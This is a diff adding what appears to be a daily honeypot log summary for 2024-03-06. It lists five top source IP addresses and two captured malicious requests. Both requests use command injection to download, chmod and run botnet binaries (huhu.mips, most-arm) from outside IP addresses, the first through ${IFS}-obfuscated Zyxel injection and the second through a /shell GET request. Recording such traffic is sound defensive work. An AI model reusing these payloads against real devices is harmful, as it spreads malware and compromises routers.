@@ -1,0 +1,23 @@
+Top 5 IPs for 2024-03-06 :
+
+122.226.191.252
+170.64.192.165
+157.230.253.126
+123.202.232.52
+148.63.158.199
+
+
+Malcious Commands seen:
+
+/bin/zhttpd/${IFS}cd${IFS}/tmp;${IFS}rm${IFS}-rf${IFS}*mips*;${IFS}wget${IFS}http://103.245.236.152/huhu.mips;${IFS}chmod${IFS}777${IFS}huhu.mips;${IFS}./huhu.mips${IFS}zyxel.selfrep;
+
+
+GET /shell?pidof+arm7+|+grep+arm7+|+xargs+kill+-9;ps+arm+|+xargs+kill+-9;cd+/tmp/;rm+-rf+most*;wget+http:/\\/103.28.33.96/most-arm;+chmod+777+most-arm;./most-arm+exploitprivate;wget+http:/\\/103.28.33.96/most-arm7;+chmod+777+most-arm7;./most-arm7+exploitprivate;rm+-rf+most* HTTP/1.1
+Connection: keep-alive
+Cache-Control: max-age=0
+User-Agent: KrebsOnSecurity
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+Accept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9
+
+
+
